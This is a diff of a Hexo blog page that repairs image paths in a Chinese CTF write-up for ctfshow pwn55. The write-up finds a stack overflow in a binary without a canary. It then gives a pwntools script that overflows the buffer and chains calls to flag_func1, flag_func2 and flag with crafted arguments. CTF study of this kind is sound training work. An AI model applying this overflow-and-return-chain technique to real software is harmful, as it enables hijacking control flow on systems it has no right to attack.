@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="ctfshow-pwn55  我们先checksec一下：  没有开启canary保护，可能是栈溢出，拖入IDA中看看：  确实是栈溢出，接下来看比较重要的三个函数：    想要flag，flag1与flag2要等于1，那么我们就得先跳到flag_fun1设置flag1等于1，再跳到flag_fun2设置flag等于1，最后再溢出到flag函数，payload如下： 123456789101112">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//2.png">
-<meta property="og:image" content="http://example.com/.com//3.png">
-<meta property="og:image" content="http://example.com/.com//4.png">
-<meta property="og:image" content="http://example.com/.com//5.png">
+<meta property="og:image" content="http://example.com/2024/05/30/ctfshow-pwn55/1.png">
+<meta property="og:image" content="http://example.com/2024/05/30/ctfshow-pwn55/2.png">
+<meta property="og:image" content="http://example.com/2024/05/30/ctfshow-pwn55/3.png">
+<meta property="og:image" content="http://example.com/2024/05/30/ctfshow-pwn55/4.png">
+<meta property="og:image" content="http://example.com/2024/05/30/ctfshow-pwn55/5.png">
 <meta property="article:published_time" content="2024-05-30T08:16:43.000Z">
 <meta property="article:modified_time" content="2024-05-30T09:12:46.282Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://example.com/2024/05/30/ctfshow-pwn55/1.png">
   
   
   
@@ -282,13 +282,13 @@
                 <h1 align="center">ctfshow-pwn55</h1>
 
 <p>我们先checksec一下：</p>
-<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2024/05/30/ctfshow-pwn55/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>没有开启canary保护，可能是栈溢出，拖入IDA中看看：</p>
-<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/2024/05/30/ctfshow-pwn55/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>确实是栈溢出，接下来看比较重要的三个函数：</p>
-<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
-<p><img src="/.com//4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
-<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/2024/05/30/ctfshow-pwn55/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="/2024/05/30/ctfshow-pwn55/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p><img src="/2024/05/30/ctfshow-pwn55/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>想要flag，flag1与flag2要等于1，那么我们就得先跳到flag_fun1设置flag1等于1，再跳到flag_fun2设置flag等于1，最后再溢出到flag函数，payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28156</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>flag_func1 = elf.symbols[<span class="hljs-string">&quot;flag_func1&quot;</span>]<br>flag_func2 = elf.symbols[<span class="hljs-string">&quot;flag_func2&quot;</span>]<br>flag = elf.symbols[<span class="hljs-string">&quot;flag&quot;</span>]<br><br>sh.recvuntil(<span class="hljs-string">b&quot;Input your flag: &quot;</span>)<br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>) + p32(flag_func1) + p32(flag_func2) + p32(flag) + p32(<span class="hljs-number">0xACACACAC</span>) + p32(<span class="hljs-number">0xBDBDBDBD</span>)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
